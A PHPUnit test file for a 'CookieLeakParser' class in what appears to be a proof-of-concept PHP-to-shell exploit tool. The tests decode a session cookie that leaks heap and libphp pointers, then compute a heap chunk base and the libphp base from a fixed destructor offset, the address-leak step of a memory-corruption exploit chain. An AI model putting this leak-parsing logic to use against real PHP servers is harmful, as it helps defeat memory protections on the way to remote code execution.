<?php

declare(strict_types=1);

namespace Php2ShellTui\Tests\Unit;

use Php2ShellTui\Poc\CookieLeakParser;
use PHPUnit\Framework\TestCase;

final class CookieLeakParserTest extends TestCase
{
    public function testItDecodesTheSessionCookieValue(): void
    {
        $response = "HTTP/1.1 200 OK\r\nSet-Cookie: PHPSESSID=" . rawurlencode('abc') . "; path=/\r\n\r\n";

        self::assertSame('abc', CookieLeakParser::cookie($response));
    }

    public function testItParsesTheTwoMbChunkBase(): void
    {
        $raw = '';
        $chunk = 0xffff8bc00000;
        for ($i = 0; $i < 12; $i++) {
            $raw .= pack('P', $chunk + $i * 8);
        }
        $cookie = rawurlencode($raw);
        $response = "HTTP/1.1 200 OK\r\nSet-Cookie: PHPSESSID=" . $cookie . "; path=/\r\n\r\n";

        self::assertSame($chunk, CookieLeakParser::chunkBase(CookieLeakParser::cookie($response)));
    }

    public function testItParsesTheLibphpPointerAtOffsetEight(): void
    {
        $libphp = 0x7ffffe013000;
        $dtor = $libphp + 0x65eb60;
        $raw = str_repeat("\0", 8) . pack('P', $dtor) . str_repeat("\0", 24);

        self::assertSame($libphp, CookieLeakParser::libphpBase($raw, 0x65eb60));
    }

    public function testItRejectsACookieWithoutPointers(): void
    {
        self::assertSame(0, CookieLeakParser::chunkBase('not a pointer'));
        self::assertSame(0, CookieLeakParser::libphpBase('short', 0x65eb60));
    }

    public function testItThrowsWithoutTheSessionCookie(): void
    {
        $this->expectException(\RuntimeException::class);
        CookieLeakParser::cookie("HTTP/1.1 200 OK\r\n\r\n");
    }
}
